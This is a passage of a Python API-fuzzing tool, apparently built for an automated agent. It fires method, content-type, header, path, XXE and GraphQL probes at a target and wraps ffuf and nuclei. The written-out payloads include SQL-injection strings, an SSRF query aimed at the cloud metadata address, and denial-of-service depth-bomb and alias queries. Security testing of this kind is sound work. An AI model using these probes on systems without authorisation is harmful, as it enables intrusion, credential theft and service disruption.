

def fuzz_http_methods(
    url: str,
    headers: dict[str, str],
    expected_method: str = "GET",
    timeout: int = 8,
) -> MethodFuzzResult:
    """
    Test all HTTP methods on an endpoint.
    Detect: unexpected methods allowed, dangerous methods (TRACE/DEBUG),
    method tunneling via headers.
    """
    result = MethodFuzzResult(endpoint=url)

    # First get OPTIONS
    try:
        opts = requests.options(
            url, headers=headers, timeout=timeout, verify=False
        )
        allow_hdr = (
            opts.headers.get("Allow") or
            opts.headers.get("allow") or
            opts.headers.get("Access-Control-Allow-Methods") or ""
        )
        result.options_response = allow_hdr
        if allow_hdr:
            result.evidence.append(f"OPTIONS Allow: {allow_hdr}")
    except Exception:
        pass

    # Test each method
    dangerous_methods = {"TRACE", "DEBUG", "CONNECT",
                          "PROPFIND", "PROPPATCH", "COPY", "MOVE"}
    write_methods     = {"PUT", "DELETE", "PATCH"}

    for method in ALL_HTTP_METHODS:
        result.methods_tested.append(method)
        try:
            resp = requests.request(
                method, url,
                headers={**headers, "User-Agent": "APIFuzzer/1.0"},
                timeout=timeout,
                verify=False,
                allow_redirects=False,
                data="test_body_for_method_fuzz" if method in
                     ("POST", "PUT", "PATCH") else None,
            )

            # Method is "allowed" if not 405 or 501
            if resp.status_code not in (405, 501, 404, 400, 403):
                result.methods_allowed.append(method)

                # Flag unexpected methods
                if method != expected_method:
                    if method in dangerous_methods:
                        result.vulnerable = True
                        result.methods_unexpected.append(method)
                        result.evidence.append(
                            f"DANGEROUS method {method} allowed: "
                            f"HTTP {resp.status_code}"
                        )
                    elif method in write_methods and resp.status_code in (200, 201, 204):
                        result.vulnerable = True
                        result.methods_unexpected.append(method)
                        result.evidence.append(
                            f"Write method {method} allowed: "
                            f"HTTP {resp.status_code}"
                        )
                    elif method == "TRACE":
                        # XST (Cross-Site Tracing)
                        if "TRACE" in (resp.text or ""):
                            result.vulnerable = True
                            result.evidence.append(
                                "TRACE method enabled → XST risk"
                            )

        except Exception:
            pass

    # Test method override via headers
    override_headers_map = {
        "X-HTTP-Method-Override": "DELETE",
        "X-Method-Override":      "PUT",
        "_method":                "DELETE",
    }
    for hdr, method in override_headers_map.items():
        try:
            resp = requests.get(
                url,
                headers={**headers, hdr: method},
                timeout=timeout,
                verify=False,
            )
            # Compare to plain GET
            plain = requests.get(url, headers=headers,
                                 timeout=timeout, verify=False)
            if resp.status_code != plain.status_code:
                result.vulnerable = True
                result.evidence.append(
                    f"Method override via '{hdr}: {method}' "
                    f"changed: {plain.status_code} → {resp.status_code}"
                )
        except Exception:
            pass

    return result


def fuzz_content_types(
    url: str,
    method: str,
    base_body: str,
    base_headers: dict[str, str],
    timeout: int = 8,
) -> ContentTypeFuzzResult:
    """
    Test all content-types on an endpoint.
    Detect: content-type bypass, type confusion, XXE via XML type.
    """
    result = ContentTypeFuzzResult(endpoint=url, method=method)

    # Baseline (JSON)
    try:
        bl_resp = requests.request(
            method, url,
            headers={**base_headers, "Content-Type": "application/json"},
            data=base_body or '{"test":"fuzz"}',
            timeout=timeout, verify=False,
        )
        bl_status = bl_resp.status_code
        bl_len    = len(bl_resp.content)
    except Exception:
        bl_status, bl_len = None, None

    for ct in CONTENT_TYPES_TO_FUZZ:

        # Build body appropriate for content type
        if "xml" in ct:
            body = '<?xml version="1.0"?><root><test>fuzz</test></root>'
        elif "form" in ct:
            body = "test=fuzz&id=1"
        elif "json" in ct:
            body = base_body or '{"test":"fuzz"}'
        elif "graphql" in ct:
            body = '{"query":"{__typename}"}'
        else:
            body = base_body or "test=fuzz"

        start = time.time()
        try:
            resp = requests.request(
                method, url,
                headers={**base_headers, "Content-Type": ct},
                data=body,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            elapsed = round(time.time() - start, 3)
            resp_headers = {k.lower(): v for k, v in resp.headers.items()}

            fr = FuzzResult(
                url=url,
                method=method,
                payload=ct,
                payload_type="content_type",
                status_code=resp.status_code,
                content_length=len(resp.content),
                response_time=elapsed,
                content_type=resp_headers.get("content-type", ""),
            )

            # Accepted = not 415 (Unsupported Media Type)
            if resp.status_code != 415:
                result.accepted_types.append(ct)
                fr.interesting = True

                # XXE via XML type
                if "xml" in ct and resp.status_code in (200, 500):
                    if any(kw in resp.text.lower() for kw in
                           ["root:", "etc/passwd", "xml"]):
                        fr.finding_type = "xxe_potential"
                        fr.severity     = "high"
                        fr.evidence.append(
                            f"XML content-type accepted → potential XXE"
                        )
                        result.bypassed = True

                # Type confusion bypass
                if bl_status and bl_status in (401, 403):
                    if resp.status_code in (200, 201, 204):
                        fr.finding_type = "content_type_bypass"
                        fr.severity     = "high"
                        fr.evidence.append(
                            f"Content-type bypass: '{ct}' → {resp.status_code}"
                        )
                        result.bypassed = True
                        result.evidence.append(
                            f"Bypass with Content-Type: {ct}"
                        )

                # Size anomaly
                if bl_len and abs(len(resp.content) - bl_len) > 200:
                    fr.evidence.append(
                        f"Size difference: baseline={bl_len}, "
                        f"this={len(resp.content)}"
                    )

            result.results.append(fr)

        except Exception:
            pass

    return result


def fuzz_path_params(
    base_url: str,
    path_template: str,
    headers: dict[str, str],
    payloads: list[tuple[str, str, str]],
    timeout: int = 8,
) -> list[FuzzResult]:
    """
    Fuzz path segments.
    e.g. /api/users/FUZZ → /api/users/../admin
    """
    results: list[FuzzResult] = []

    # Baseline
    try:
        bl_url  = base_url.rstrip("/") + path_template.replace("FUZZ", "1")
        bl_resp = requests.get(bl_url, headers=headers,
                               timeout=timeout, verify=False)
        bl_status = bl_resp.status_code
        bl_len    = len(bl_resp.content)
    except Exception:
        bl_status, bl_len = None, None

    for payload, label, cat in payloads:
        # URL-encode payload for path
        safe_payload = payload.replace("/", "%2F").replace("?", "%3F") \
            if cat != "path_traversal" else payload

        fuzz_path = path_template.replace("FUZZ", safe_payload)
        url = base_url.rstrip("/") + fuzz_path

        start = time.time()
        try:
            resp = requests.get(
                url, headers=headers, timeout=timeout,
                verify=False, allow_redirects=False,
            )
            elapsed = round(time.time() - start, 3)
            result  = analyze_response(
                url=url,
                method="GET",
                payload=payload,
                payload_type=cat,
                label=label,
                resp_status=resp.status_code,
                resp_body=resp.text[:3000],
                resp_headers={k.lower(): v for k, v in resp.headers.items()},
                resp_time=elapsed,
                baseline_status=bl_status,
                baseline_len=bl_len,
            )
            if result.interesting or result.error_detected:
                results.append(result)

        except requests.exceptions.Timeout:
            if "sleep" in label or "time" in label:
                results.append(FuzzResult(
                    url=url, method="GET",
                    payload=payload[:100], payload_type=cat,
                    response_time=timeout,
                    interesting=True,
                    finding_type="time_based_injection",
                    severity="high",
                    evidence=[f"Path timeout: {label}"],
                ))
        except Exception:
            pass

    return results


def fuzz_headers(
    url: str,
    method: str,
    base_headers: dict[str, str],
    payloads: list[tuple[str, str, str]],
    timeout: int = 8,
) -> list[FuzzResult]:
    """
    Inject payloads into common HTTP headers.
    User-Agent, Referer, X-Forwarded-For, Host, etc.
    """
    results: list[FuzzResult] = []

    injectable_headers = [
        "User-Agent", "Referer", "X-Forwarded-For",
        "X-Real-IP", "Accept-Language", "Accept",
        "Host", "X-Api-Key", "X-Custom-Header",
        "Authorization", "Cookie",
    ]

    # Baseline
    try:
        bl = requests.request(method, url, headers=base_headers,
                              timeout=timeout, verify=False)
        bl_status = bl.status_code
        bl_len    = len(bl.content)
    except Exception:
        bl_status, bl_len = None, None

    # Only test injection-relevant payloads in headers
    header_relevant_cats = {"sqli", "xss", "ssti", "ssrf", "cmdi", "overflow"}
    header_payloads = [
        (p, l, c) for p, l, c in payloads
        if c in header_relevant_cats
    ][:50]  # cap header fuzzing

    for hdr_name in injectable_headers[:6]:  # cap headers
        for payload, label, cat in header_payloads[:15]:
            test_headers = {**base_headers, hdr_name: payload}
            start = time.time()
            try:
                resp = requests.request(
                    method, url, headers=test_headers,
                    timeout=timeout, verify=False,
                    allow_redirects=False,
                )
                elapsed = round(time.time() - start, 3)
                result  = analyze_response(
                    url=url,
                    method=method,
                    payload=payload,
                    payload_type=cat,
                    label=label,
                    resp_status=resp.status_code,
                    resp_body=resp.text[:3000],
                    resp_headers={k.lower(): v
                                  for k, v in resp.headers.items()},
                    resp_time=elapsed,
                    baseline_status=bl_status,
                    baseline_len=bl_len,
                    param_name=f"header:{hdr_name}",
                )
                if result.interesting or result.error_detected:
                    result.evidence.insert(
                        0, f"Injected via header '{hdr_name}'"
                    )
                    results.append(result)

            except requests.exceptions.Timeout:
                if "sleep" in label or "time" in label:
                    results.append(FuzzResult(
                        url=url, method=method,
                        payload=payload[:100], payload_type=cat,
                        param_name=f"header:{hdr_name}",
                        response_time=timeout,
                        interesting=True,
                        finding_type="time_based_injection",
                        severity="high",
                        evidence=[f"Header '{hdr_name}' timeout: {label}"],
                    ))
            except Exception:
                pass

    return results


def fuzz_xxe(
    url: str,
    method: str,
    base_headers: dict[str, str],
    timeout: int = 10,
) -> list[FuzzResult]:
    """
    Dedicated XXE fuzzer — sends XML payloads with XXE entities.
    Tests both file:// and SSRF via XXE.
    """
    results: list[FuzzResult] = []

    xml_headers = {
        **base_headers,
        "Content-Type": "application/xml",
        "Accept":       "application/xml, text/xml, */*",
    }

    for item in XXE_PAYLOADS:
        payload = item["payload"]
        label   = item["label"]
        start   = time.time()

        try:
            resp = requests.request(
                method, url,
                headers=xml_headers,
                data=payload.encode("utf-8"),
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            elapsed = round(time.time() - start, 3)
            body    = resp.text[:3000]

            # Check for XXE success indicators
            is_vuln = any(indicator in body for indicator in [
                "root:x:0:0", "daemon:x:", "nobody:",
                "ami-id", "computeMetadata",
                "[fonts]", "[extensions]",
            ])

            fr = FuzzResult(
                url=url,
                method=method,
                payload=payload[:200],
                payload_type="xxe",
                status_code=resp.status_code,
                content_length=len(resp.content),
                response_time=elapsed,
                response_snippet=body[:300],
                interesting=is_vuln or resp.status_code == 500,
                error_detected=is_vuln,
                finding_type="xxe" if is_vuln else "none",
                severity="critical" if is_vuln else "info",
            )
            if is_vuln:
                fr.evidence.append(
                    f"XXE success: file content or metadata in response"
                )
            elif resp.status_code == 500:
                fr.evidence.append("500 error on XML payload — parser may exist")

            if fr.interesting:
                results.append(fr)

        except Exception:
            pass

    return results


def fuzz_graphql(
    url: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> list[FuzzResult]:
    """
    Fuzz GraphQL endpoints with injection payloads.
    Tests: field injection, alias attacks, depth limit, batch injection.
    """
    results: list[FuzzResult] = []

    gql_headers = {
        **headers,
        "Content-Type": "application/json",
    }

    gql_payloads = [
        # Injection in GQL args
        {"query": '{ user(id: "1 OR 1=1") { id email } }',
         "label": "gql_sqli_id"},
        {"query": '{ user(id: "\'") { id } }',
         "label": "gql_sqli_quote"},
        # Alias amplification (DoS)
        {"query": " ".join([
            f'alias{i}: user(id: 1) {{ id email }}' for i in range(100)
        ]),
         "label": "gql_alias_dos"},
        # Depth bomb
        {"query": "{ " + "user { friend { " * 15 + "id" + " } }" * 15 + " }",
         "label": "gql_depth_bomb"},
        # Batch injection
        [{"query": '{ __typename }'}] * 50,
        # SSRF via URL argument
        {"query": '{ fetch(url: "http://169.254.169.254/latest/meta-data/") { data } }',
         "label": "gql_ssrf"},
        # Introspection (should be disabled in prod)
        {"query": "{ __schema { types { name } } }",
         "label": "gql_introspection"},
        # Null bytes
        {"query": "{ user(id: \"\x00\") { id } }",
         "label": "gql_null_byte"},
    ]

    for payload in gql_payloads:
        label = payload.get("label", "gql_fuzz") \
            if isinstance(payload, dict) else "gql_batch"
        start = time.time()
        try:
            resp = requests.post(
                url, json=payload,
                headers=gql_headers,
                timeout=timeout,
                verify=False,
            )
            elapsed = round(time.time() - start, 3)
            body    = resp.text[:3000]

            interesting = any([
                resp.status_code == 500,
                elapsed > 2.5,
                any(sig in body.lower() for sig in
                    ["sql", "error", "exception", "traceback",
                     "root:x:", "ami-id"]),
                "errors" in body.lower() and resp.status_code == 200,
            ])

            fr = FuzzResult(
                url=url,
                method="POST",
                payload=json.dumps(payload)[:200],
                payload_type="graphql",
                status_code=resp.status_code,
                content_length=len(resp.content),
                response_time=elapsed,
                response_snippet=body[:300],
                interesting=interesting,
                finding_type="graphql_injection" if interesting else "none",
                severity="high" if interesting else "info",
            )
            if interesting:
                fr.evidence.append(
                    f"GraphQL fuzz: label={label}, "
                    f"status={resp.status_code}, time={elapsed:.2f}s"
                )
                results.append(fr)

        except requests.exceptions.Timeout:
            if "dos" in label or "depth" in label or "batch" in label:
                results.append(FuzzResult(
                    url=url, method="POST",
                    payload=json.dumps(payload)[:100],
                    payload_type="graphql",
                    response_time=timeout,
                    interesting=True,
                    finding_type="graphql_dos",
                    severity="medium",
                    evidence=[f"GraphQL timeout: {label} — possible DoS"],
                ))
        except Exception:
            pass

    return results


# ══════════════════════════════════════════════════════════════
# 6. PARSERS
# ══════════════════════════════════════════════════════════════

def parse_ffuf_fuzz(stdout: str, stderr: str,
                    target: str) -> list[FuzzResult]:
    """
    Parse ffuf JSON output from fuzzing run.
    ffuf -json outputs: {"results": [{url, status, length, words, lines}]}
    """
    results: list[FuzzResult] = []

    # Full JSON object
    try:
        data = json.loads(stdout)
        for r in data.get("results", []):
            url    = r.get("url", "")
            status = r.get("status", 0)
            length = r.get("length", 0)
            words  = r.get("words", 0)
            lines  = r.get("lines", 0)
            inp    = r.get("input", {})
            fuzz   = inp.get("FUZZ", b"").decode() \
                if isinstance(inp.get("FUZZ"), bytes) \
                else inp.get("FUZZ", "")

            interesting = status in INTERESTING_STATUS and status != 404
            fr = FuzzResult(
                url=url,
                method=r.get("method", "GET"),
                payload=fuzz[:200],
                payload_type="wordlist",
                status_code=status,
                content_length=length,
                interesting=interesting,
                finding_type="wordlist_hit" if interesting else "none",
                severity="medium" if status in (200, 201) else "info",
                evidence=[
                    f"ffuf: status={status}, "
                    f"size={length}, words={words}, lines={lines}"
                ],
            )
            if interesting:
                results.append(fr)
        return results
    except json.JSONDecodeError:
        pass

    # Line-by-line JSON
    for line in stdout.splitlines():
        line = line.strip()
        if not line or not line.startswith("{"):
            continue
        try:
            r      = json.loads(line)
            url    = r.get("url", "")
            status = r.get("status", 0)
            fuzz   = r.get("input", {}).get("FUZZ", "")
            if isinstance(fuzz, bytes):
                fuzz = fuzz.decode()

            if url and status in INTERESTING_STATUS:
                results.append(FuzzResult(
                    url=url,
                    method="GET",
                    payload=fuzz[:200],
                    payload_type="wordlist",
                    status_code=status,
                    content_length=r.get("length", 0),
                    interesting=True,
                    severity="medium",
                    evidence=[f"ffuf line: status={status}"],
                ))
        except json.JSONDecodeError:
            continue

    # Plain text
    if not results:
        pat = re.compile(
            r"(\S+)\s+\[Status:\s*(\d+),\s*Size:\s*(\d+)"
        )
        for line in stdout.splitlines():
            m = pat.search(line)
            if m:
                status = int(m.group(2))
                if status in INTERESTING_STATUS:
                    url = target.rstrip("/") + "/" + m.group(1).lstrip("/")
                    results.append(FuzzResult(
                        url=url,
                        method="GET",
                        payload=m.group(1),
                        payload_type="wordlist",
                        status_code=status,
                        content_length=int(m.group(3)),
                        interesting=True,
                        severity="medium",
                        evidence=[f"ffuf text: {line.strip()[:100]}"],
                    ))

    return results


def parse_nuclei_fuzz(stdout: str, stderr: str) -> list[FuzzResult]:
    """
    Parse nuclei output from API fuzzing templates.
    Supports JSON (-json) and plain text output.
    """
    results: list[FuzzResult] = []

    for line in stdout.splitlines():
        line = line.strip()
        if not line:
            continue

        # JSON output
        try:
            data = json.loads(line)
            url      = (data.get("matched-at")
                        or data.get("host")
                        or data.get("input", ""))
            template = data.get("template-id", "")
            severity = data.get("info", {}).get("severity", "info").lower()
            name     = data.get("info", {}).get("name", template)

            # Map nuclei template to our payload type
            ptype = "nuclei"
            if "sqli" in template or "sql" in template:
                ptype = "sqli"
            elif "xss" in template:
                ptype = "xss"
            elif "ssrf" in template:
                ptype = "ssrf"
            elif "ssti" in template:
                ptype = "ssti"
            elif "lfi" in template or "traversal" in template:
                ptype = "path_traversal"
            elif "xxe" in template:
                ptype = "xxe"

            fr = FuzzResult(
                url=url,
                method=data.get("request", "").split(" ")[0] or "GET",
                payload=template,
                payload_type=ptype,
                status_code=data.get("status-code"),
                interesting=True,
                finding_type=ptype,
                severity=severity,
                evidence=[
                    f"nuclei: [{template}] {name}",
                    f"Severity: {severity}",
                ],
                response_snippet=data.get("extracted-results", [""])[0][:200]
                if data.get("extracted-results") else None,
            )
            results.append(fr)
            continue

        except json.JSONDecodeError:
            pass

        # Plain text: [severity] [template] URL
        m = re.match(
            r"\[([^\]]+)\]\s+\[([^\]]+)\]\s+\[([^\]]+)\]\s+(https?://\S+)",
            line
        )
        if m:
            severity = m.group(1).lower()
            template = m.group(2)
            _        = m.group(3)
            url      = m.group(4)
            results.append(FuzzResult(
                url=url,
                method="GET",
                payload=template,
                payload_type="nuclei",
                interesting=True,
                finding_type="nuclei_finding",
                severity=severity,
                evidence=[f"nuclei: {line}"],
            ))

    return results


# ══════════════════════════════════════════════════════════════
# 7. EXECUTOR
# ══════════════════════════════════════════════════════════════

def safe_execute(cmd: list[str], timeout: int = 600) -> tuple[str, str, int]:
    """Run subprocess safely — no shell, no injection."""
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, shell=False,
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", f"Timed out after {timeout}s", -1
    except FileNotFoundError:
        return "", f"Tool '{cmd[0]}' not installed", -1
    except Exception as e:
        return "", str(e), -1


# ══════════════════════════════════════════════════════════════
# 8. MAIN TOOL FUNCTION
# ══════════════════════════════════════════════════════════════

def api_fuzzing(
    tool:          str,
    target:        str,
    args:          list[str] = [],
    endpoints:     list[str] = [],
    headers:       dict[str, str] = {},
    wordlist:      Optional[str] = None,
    methods:       list[str] = ["GET", "POST", "PUT", "DELETE", "PATCH"],
    content_types: list[str] = [],
    params:        dict[str, str] = {},
    body:          Optional[str] = None,
) -> dict:
    """
    🔧 Agent Tool: API Fuzzer

    Capabilities:
      ┌───────────────────────────────────────────────────────────────────┐
      │  PARAM FUZZING        URL params, body fields, path segments,     │
      │                       HTTP headers                                 │
      │  INJECTION PAYLOADS   SQLi (30), XSS (20), SSTI (17), LFI (18), │
      │                       CMDi (17), Overflow (19), SSRF (17),        │
      │                       XXE (6), Open Redirect (11)                 │
      │  METHOD FUZZING       All HTTP methods on every endpoint          │
      │                       Detect: PUT/DELETE on GET-only, TRACE/DEBUG  │
      │  CONTENT-TYPE FUZZ    20 content types → bypass, XXE trigger      │
      │  GRAPHQL FUZZING      Alias DoS, depth bomb, injection, batch     │
      │  RESPONSE ANALYSIS    Error signatures, reflection, time-based,   │
      │                       size anomalies, status code changes          │
      │  TOOL INTEGRATION     ffuf, nuclei api templates, manual Python   │
      └───────────────────────────────────────────────────────────────────┘

    Args:
        tool:          "ffuf" | "nuclei" | "manual"
        target:        Base URL (e.g. "https://api.example.com")
        args:          Raw tool arguments — agent decides
        endpoints:     Specific endpoints to fuzz
        headers:       Custom HTTP headers
        wordlist:      Wordlist for ffuf/nuclei
        methods:       HTTP methods to test
        content_types: Content types to fuzz
        params:        Baseline URL params to fuzz
        body:          Baseline request body to fuzz

    Tool args reference:
      ffuf:
        Param fuzz: ["-w", "payloads.txt:FUZZ", "-u", "URL?param=FUZZ"]
        Body fuzz:  ["-w", "payloads.txt", "-X", "POST",
                     "-d", '{"param":"FUZZ"}', "-H", "Content-Type: application/json"]
        Filter:     ["-fc", "404,400", "-fs", "0", "-fw", "10"]
        Rate:       ["-rate", "100", "-t", "50"]
        Recursive:  ["-recursion", "-recursion-depth", "3"]

      nuclei:
        API fuzz:   ["-t", "fuzzing/", "-tags", "fuzz"]
        Specific:   ["-t", "fuzzing/sql-injection.yaml"]
        DAST:       ["-dast", "-t", "fuzzing/"]
        Rate:       ["-rl", "50", "-c", "10"]

      manual:
        (all fuzzing techniques run automatically — no args needed)

    Returns:
        Structured JSON: fuzz_results → param_summaries →
                         method_results → content_type_results →
                         critical_findings
    """
    start = time.time()

    # ══════════════════════════════
    # VALIDATE
    # ══════════════════════════════
    try:
        req = APIFuzzRequest(
            tool=tool, target=target, args=args,
            endpoints=endpoints, headers=headers,
            wordlist=wordlist, methods=methods,
            content_types=content_types or CONTENT_TYPES_TO_FUZZ,
            params=params, body=body,
        )
    except Exception as e:
        return APIFuzzingResult(
            success=False, tool=tool, target=target,
            command="", error=f"Validation: {e}"
        ).model_dump()

    # Normalise target
    if not target.startswith("http"):
        target = f"https://{target}"
    target = target.rstrip("/")

    all_results:          list[FuzzResult]           = []
    param_summaries:      list[ParamFuzzSummary]     = []
    method_results:       list[MethodFuzzResult]     = []
    content_type_results: list[ContentTypeFuzzResult] = []
    command_str:          str = ""
    raw_output:           str = ""
    error_msg:            Optional[str] = None
    techniques_used:      list[str] = []

    # Build endpoint list
    all_endpoints = [target] + [
        e if e.startswith("http") else target.rstrip("/") + "/" + e.lstrip("/")
        for e in req.endpoints
    ]
    all_endpoints = list(dict.fromkeys(all_endpoints))

    # Build payloads
    all_payloads = build_payload_list(limit_per_category=15)

    # ══════════════════════════════
    # TOOL: MANUAL
    # ══════════════════════════════
    if tool == "manual":
        command_str = f"manual_api_fuzz({target}, {len(all_endpoints)} endpoints)"

        for ep in all_endpoints:
            with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:

                # ── URL param fuzzing ──
                fut_url = ex.submit(
                    fuzz_url_params,
                    ep, "GET", req.params, req.headers,
                    all_payloads,
                )

                # ── Body fuzzing (POST/PUT) ──
                fut_body_post = ex.submit(
                    fuzz_body_params,
                    ep, "POST", req.body,
                    "application/json", req.headers,
                    all_payloads,
                )
                fut_body_put = ex.submit(
                    fuzz_body_params,
                    ep, "PUT", req.body,
                    "application/json", req.headers,
                    all_payloads[:50],  # cap for PUT
                )

                # ── HTTP method fuzzing ──
                fut_methods = ex.submit(
                    fuzz_http_methods,
                    ep, req.headers, "GET",
                )

                # ── Content-type fuzzing ──
                fut_ct = ex.submit(
                    fuzz_content_types,
                    ep, "POST",
                    req.body or '{"test":"fuzz"}',
                    req.headers,
                )

                # ── Header injection ──
                fut_hdrs = ex.submit(
                    fuzz_headers,
                    ep, "GET", req.headers, all_payloads,
                )

                # ── XXE ──
                fut_xxe = ex.submit(
                    fuzz_xxe,
                    ep, "POST", req.headers,
                )

                # ── GraphQL fuzz (if endpoint looks like GQL) ──
                fut_gql = None
                if any(kw in ep.lower() for kw in
                       ["graphql", "graphiql", "query", "/gql"]):
                    fut_gql = ex.submit(
                        fuzz_graphql,
                        ep, req.headers,
                    )

                # Collect results
                for fut, label in [
                    (fut_url,       "url_param_fuzz"),
                    (fut_body_post, "body_fuzz_post"),
                    (fut_body_put,  "body_fuzz_put"),
                    (fut_hdrs,      "header_injection"),
                    (fut_xxe,       "xxe_fuzz"),
                ]:
                    try:
                        res = fut.result()
                        all_results.extend(res)
                        if res:
                            techniques_used.append(label)
                    except Exception as e:
                        pass

                # Method results
                try:
                    mr = fut_methods.result()
                    method_results.append(mr)
                    techniques_used.append("method_fuzz")
                except Exception:
                    pass

                # Content-type results
                try:
                    ctr = fut_ct.result()
                    content_type_results.append(ctr)
                    techniques_used.append("content_type_fuzz")
                except Exception:
                    pass

                # GraphQL results
                if fut_gql:
                    try:
                        gql_res = fut_gql.result()
                        all_results.extend(gql_res)
                        techniques_used.append("graphql_fuzz")
                    except Exception:
                        pass

            # ── Path param fuzzing ──
            # Try common path patterns
            path_templates = [
                "/api/users/FUZZ",
                "/api/v1/FUZZ",
                "/api/FUZZ",
                "/FUZZ",
            ]
            # Extract path from endpoint and add FUZZ
            ep_path = re.sub(r"https?://[^/]+", "", ep)
            if ep_path and ep_path != "/":
                path_templates.insert(0, ep_path + "/FUZZ")
                path_templates.insert(0, ep_path.rsplit("/", 1)[0] + "/FUZZ")

            path_results = fuzz_path_params(
                target,
                path_templates[0],
                req.headers,
                [(p, l, c) for p, l, c in all_payloads
                 if c in ("path_traversal", "overflow", "sqli")][:30],
            )
            all_results.extend(path_results)
            if path_results:
                techniques_used.append("path_param_fuzz")

        # ── Build param summaries ──
        params_seen: dict[str, list[FuzzResult]] = {}
        for r in all_results:
            if r.param_name:
                key = f"{r.url}::{r.param_name}"
                params_seen.setdefault(key, []).append(r)

        for key, fuzz_rs in params_seen.items():
            ep_url, param = key.split("::", 1)
            summary = ParamFuzzSummary(
                param_name=param,
                endpoint=ep_url,
                total_payloads=len(fuzz_rs),
                interesting_responses=[r for r in fuzz_rs if r.interesting],
                error_responses=[r for r in fuzz_rs if r.error_detected],
            )
            summary.vulnerable = bool(
                summary.interesting_responses or summary.error_responses
            )
            summary.vuln_types = list({
                r.finding_type for r in
                summary.interesting_responses + summary.error_responses
                if r.finding_type != "none"
            })
            if summary.vulnerable:
                anomalies = list({
                    e for r in
                    summary.interesting_responses + summary.error_responses
                    for e in r.evidence
                })
                summary.anomalies = anomalies[:5]
            param_summaries.append(summary)

    # ══════════════════════════════
    # TOOL: FFUF
    # ══════════════════════════════
    elif tool == "ffuf":
        import tempfile, os

        # Write payloads to temp wordlist if no external wordlist
        tmp_wl = None
        if req.wordlist:
            wl_path = req.wordlist
        else:
            tmp_wl = tempfile.NamedTemporaryFile(
                mode="w", suffix=".txt",
                delete=False, prefix="fuzz_payloads_"
            )
            all_p = build_payload_list(limit_per_category=30)
            tmp_wl.write("\n".join(p for p, _, _ in all_p))
            tmp_wl.close()
            wl_path = tmp_wl.name

        commands_run = []

        for ep in all_endpoints:
            # Determine FUZZ position
            if req.params:
                # Fuzz first param value
                param = list(req.params.keys())[0]
                fuzz_url = f"{ep}?{param}=FUZZ"
            else:
                fuzz_url = f"{ep}?id=FUZZ"

            cmd = [
                "ffuf",
                "-u",    fuzz_url,
                "-w",    f"{wl_path}:FUZZ",
                "-mc",   "all",
                "-fc",   "404",
                "-json",
                "-t",    "30",
                "-timeout", "8",
                "-rate", "100",
            ]

            # Add custom headers
            for k, v in req.headers.items():
                cmd.extend(["-H", f"{k}: {v}"])

            cmd += list(req.args)
            commands_run.append(" ".join(cmd))

            stdout, stderr, rc = safe_execute(cmd, req.timeout // len(all_endpoints))
            raw_output += (stdout or stderr)[:2000]

            parsed = parse_ffuf_fuzz(stdout, stderr, ep)
            all_results.extend(parsed)

            if rc != 0 and not parsed:
                error_msg = (stderr or stdout)[:300]

            # Also fuzz body if POST
            if "POST" in req.methods or "PUT" in req.methods:
                body_val  = req.body or '{"FUZZ":"test"}'
                body_fuzz = body_val.replace("{", '{"FUZZ":').replace(
                    "}", ',"_fuzz":1}'
                ) if "FUZZ" not in body_val else body_val

                cmd_post = [
                    "ffuf",
                    "-u",   ep,
                    "-w",   f"{wl_path}:FUZZ",
                    "-X",   "POST",
                    "-d",   body_fuzz,
                    "-H",   "Content-Type: application/json",
                    "-mc",  "all",
                    "-fc",  "404",
                    "-json",
                    "-t",   "20",
                    "-rate","50",
                ]
                for k, v in req.headers.items():
                    cmd_post.extend(["-H", f"{k}: {v}"])

                commands_run.append(" ".join(cmd_post))
                stdout2, stderr2, _ = safe_execute(
                    cmd_post, req.timeout // len(all_endpoints)
                )
                parsed2 = parse_ffuf_fuzz(stdout2, stderr2, ep)
                all_results.extend(parsed2)

        command_str = " | ".join(commands_run[:3])
        techniques_used.append("ffuf_fuzz")

        # Supplement with manual method + content-type fuzzing
        for ep in all_endpoints[:3]:
            mr  = fuzz_http_methods(ep, req.headers)
            method_results.append(mr)
            ctr = fuzz_content_types(ep, "POST",
                                      req.body or '{"test":"fuzz"}',
                                      req.headers)
            content_type_results.append(ctr)
        techniques_used += ["method_fuzz", "content_type_fuzz"]

        # Cleanup
        if tmp_wl and os.path.exists(wl_path):
            os.unlink(wl_path)

    # ══════════════════════════════
    # TOOL: NUCLEI
    # ══════════════════════════════
    elif tool == "nuclei":
        import tempfile, os

        # Write endpoints to temp file
        tmp_ep = tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt",
            delete=False, prefix="fuzz_targets_"
        )
        tmp_ep.write("\n".join(all_endpoints))
        tmp_ep.close()

        # Default nuclei fuzzing command
        if req.args and req.args[0] not in ("-t", "-tags", "-u", "-l"):
            cmd = ["nuclei"] + list(req.args)
        else:
            cmd = [
                "nuclei",
                "-l",    tmp_ep.name,
                "-tags", "fuzz",
                "-json",
                "-rl",   "50",
                "-c",    "10",
                "-timeout", "10",
            ]
            # Add custom headers
            for k, v in req.headers.items():
                cmd.extend(["-H", f"{k}: {v}"])

            # Use template dir or specific templates
            if req.wordlist:
                cmd.extend(["-t", req.wordlist])
            elif not any(a in req.args for a in ["-t", "--template"]):
                cmd.extend(["-t", "fuzzing/"])

            cmd += list(req.args)

        command_str = " ".join(cmd)
        stdout, stderr, rc = safe_execute(cmd, req.timeout)
        raw_output = (stdout or stderr)[:5000]

        parsed = parse_nuclei_fuzz(stdout, stderr)
        all_results.extend(parsed)
        techniques_used.append("nuclei_fuzz")

        if rc != 0 and not parsed:
            error_msg = (stderr or stdout)[:400]

        # Supplement with manual method + content-type + XXE
        for ep in all_endpoints[:3]:
            mr = fuzz_http_methods(ep, req.headers)
            method_results.append(mr)
            ctr = fuzz_content_types(ep, "POST",
                                      req.body or '{"test":"fuzz"}',
                                      req.headers)
            content_type_results.append(ctr)
            xxe_res = fuzz_xxe(ep, "POST", req.headers)
            all_results.extend(xxe_res)

        techniques_used += ["method_fuzz", "content_type_fuzz", "xxe_fuzz"]

        # Cleanup
        if os.path.exists(tmp_ep.name):
            os.unlink(tmp_ep.name)

    # ══════════════════════════════
    # POST-PROCESS
    # ══════════════════════════════
    severity_rank = {
        "critical": 4, "high": 3,
        "medium": 2, "low": 1, "info": 0,
    }

    # Sort by severity
    all_results.sort(
        key=lambda r: severity_rank.get(r.severity, 0),
        reverse=True,
    )

